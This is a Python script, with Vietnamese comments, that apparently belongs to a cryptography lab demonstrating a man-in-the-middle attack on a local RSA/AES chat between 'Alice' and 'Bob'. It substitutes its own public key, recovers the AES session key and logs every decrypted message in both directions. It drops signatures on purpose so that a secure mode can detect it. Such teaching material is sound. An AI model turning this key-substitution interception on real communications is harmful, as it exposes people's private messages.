import socket
import threading
import json
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from shared.crypto_utils import (
    generate_rsa_keypair, serialize_public_key, deserialize_public_key,
    rsa_encrypt, rsa_decrypt,
    aes_encrypt, aes_decrypt,
    bytes_to_b64, b64_to_bytes, pretty_hex,
)

# ===== CONFIG =====
LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = 5555

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 65432

# ===== COLORS =====
RESET  = "\033[0m"
BOLD   = "\033[1m"
CYAN   = "\033[96m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"
MAGENTA= "\033[95m"


class MITMAttacker:
    def __init__(self):
        print(f"\n{RED}{BOLD}╔══════════════════════════════════════╗")
        print(f"║          MITM ATTACKER ACTIVE      ║")
        print(f"╚══════════════════════════════════════╝{RESET}\n")

        # RSA attacker
        self._log("RSA", "Sinh RSA key giả...")
        self.priv, self.pub = generate_rsa_keypair(2048)
        self.pub_pem = serialize_public_key(self.pub).decode()

        # AES (chỉ 1 key)
        self.aes_key = None

        # sockets
        self.alice_conn = None
        self.server_conn = None

        self.real_bob_pub = None
        self.running = True

    def _log(self, tag, msg):
        colors = {"RSA": YELLOW, "AES": GREEN, "SYS": CYAN, "ERR": RED, "HACK": MAGENTA}
        print(f"{colors.get(tag,'')}" + f"[{tag}]{RESET} {msg}")

    def _send(self, conn, data):
        raw = json.dumps(data).encode()
        conn.sendall(len(raw).to_bytes(4, "big") + raw)

    def _recv(self, conn):
        raw_len = conn.recv(4)
        if not raw_len:
            raise ConnectionError
        length = int.from_bytes(raw_len, "big")

        raw = b""
        while len(raw) < length:
            raw += conn.recv(4096)

        return json.loads(raw.decode())

    def _shutdown(self, reason):
        """Dừng attacker, đóng cả 2 connection."""
        if not self.running:
            return
        self.running = False
        self._log("SYS", f"Attacker shutdown: {reason}")
        try:
            self.alice_conn.shutdown(socket.SHUT_RDWR)
            self.alice_conn.close()
        except:
            pass
        try:
            self.server_conn.shutdown(socket.SHUT_RDWR)
            self.server_conn.close()
        except:
            pass
        os._exit(0)

    # =========================

    def start(self):
        # listen Alice
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.bind((LISTEN_HOST, LISTEN_PORT))
        listener.listen(1)

        self._log("SYS", f"Chờ Alice tại {LISTEN_HOST}:{LISTEN_PORT} ...")
        self.alice_conn, _ = listener.accept()
        self._log("SYS", "Alice đã kết nối")

        # connect server
        self.server_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_conn.connect((SERVER_HOST, SERVER_PORT))
        self._log("SYS", "Kết nối tới server")

        # start threads
        threading.Thread(target=self.handle_alice, daemon=True).start()
        threading.Thread(target=self.handle_server, daemon=True).start()

        while self.running:
            pass

    # =========================

    def handle_alice(self):
        """Nhận message từ Alice, intercept rồi forward lên server."""
        try:
            while self.running:
                msg = self._recv(self.alice_conn)

                # HELLO
                if msg["type"] == "hello":
                    self._log("HACK", "Intercept HELLO từ Alice")

                    # gửi lên server với key giả
                    self._send(self.server_conn, {
                        "type": "hello",
                        "name": "alice",
                        "pub_key_pem": self.pub_pem
                    })

                # AES KEY
                elif msg["type"] == "aes_key_exchange":
                    encrypted = b64_to_bytes(msg["encrypted_aes_key"])

                    self.aes_key = rsa_decrypt(self.priv, encrypted)

                    self._log("HACK", " Lấy được AES key:")
                    self._log("AES", pretty_hex(self.aes_key))

                    if not self.real_bob_pub:
                        self._log("ERR", "Chưa có public key Bob")
                        continue

                    # re-encrypt gửi Bob
                    encrypted2 = rsa_encrypt(self.real_bob_pub, self.aes_key)

                    self._send(self.server_conn, {
                        "type": "aes_key_exchange",
                        "encrypted_aes_key": bytes_to_b64(encrypted2)
                    })

                # CHAT — intercept nhưng KHÔNG forward signature
                # (đây chính là điểm bị phát hiện khi secure mode)
                elif msg["type"] == "chat":
                    if not self.aes_key:
                        self._log("ERR", "Chưa có AES key")
                        continue

                    plaintext = aes_decrypt(
                        self.aes_key,
                        msg["iv"],
                        msg["ciphertext"]
                    )

                    self._log("HACK", f" Alice → Bob: {plaintext}")

                    enc = aes_encrypt(self.aes_key, plaintext)

                    # FIX: KHÔNG forward signature (attacker không có private key Alice
                    # nên không thể tạo signature hợp lệ) → Bob sẽ detect MITM
                    self._send(self.server_conn, {
                        "type": "chat",
                        "iv": enc["iv"],
                        "ciphertext": enc["ciphertext"]
                        # signature bị drop có chủ ý → Bob detect MITM
                    })

                # FIX: forward terminate lên server → server forward sang Bob → Bob dừng
                elif msg["type"] == "terminate":
                    reason = msg.get("reason", "peer terminated")
                    self._log("SYS", f"Alice terminate: {reason} → forward lên server")
                    self._send(self.server_conn, {
                        "type": "terminate",
                        "reason": reason
                    })
                    self._shutdown(f"Alice detected MITM: {reason}")

        except Exception as e:
            if self.running:
                self._log("ERR", f"Alice lỗi: {e}")
                self._shutdown("Alice connection lost")

    # =========================

    def handle_server(self):
        """Nhận message từ server (thực ra là từ Bob), forward xuống Alice."""
        try:
            while self.running:
                msg = self._recv(self.server_conn)

                # PUBLIC KEY BOB
                if msg["type"] == "peer_pubkey":
                    self._log("RSA", "Nhận public key Bob")

                    self.real_bob_pub = deserialize_public_key(
                        msg["pub_key_pem"].encode()
                    )

                    # gửi key giả cho Alice
                    self._send(self.alice_conn, {
                        "type": "peer_pubkey",
                        "from": "bob",
                        "pub_key_pem": self.pub_pem
                    })

                # CHAT từ Bob
                elif msg["type"] == "chat":
                    if not self.aes_key:
                        self._log("ERR", "Chưa có AES key")
                        continue

                    plaintext = aes_decrypt(
                        self.aes_key,
                        msg["iv"],
                        msg["ciphertext"]
                    )

                    self._log("HACK", f" Bob → Alice: {plaintext}")

                    enc = aes_encrypt(self.aes_key, plaintext)

                    self._send(self.alice_conn, {
                        "type": "chat",
                        "from": "bob",
                        "iv": enc["iv"],
                        "ciphertext": enc["ciphertext"]
                        # signature bị drop có chủ ý
                    })

                # FIX: forward terminate từ server/Bob xuống Alice
                elif msg["type"] == "terminate":
                    reason = msg.get("reason", "peer terminated")
                    self._log("SYS", f"Server terminate: {reason} → forward xuống Alice")
                    self._send(self.alice_conn, {
                        "type": "terminate",
                        "reason": reason
                    })
                    self._shutdown(f"Server terminated: {reason}")

                else:
                    # forward ACK, peer_offline, ...
                    self._send(self.alice_conn, msg)

        except Exception as e:
            if self.running:
                self._log("ERR", f"Server lỗi: {e}")
                self._shutdown("Server connection lost")


# =========================

if __name__ == "__main__":
    MITMAttacker().start()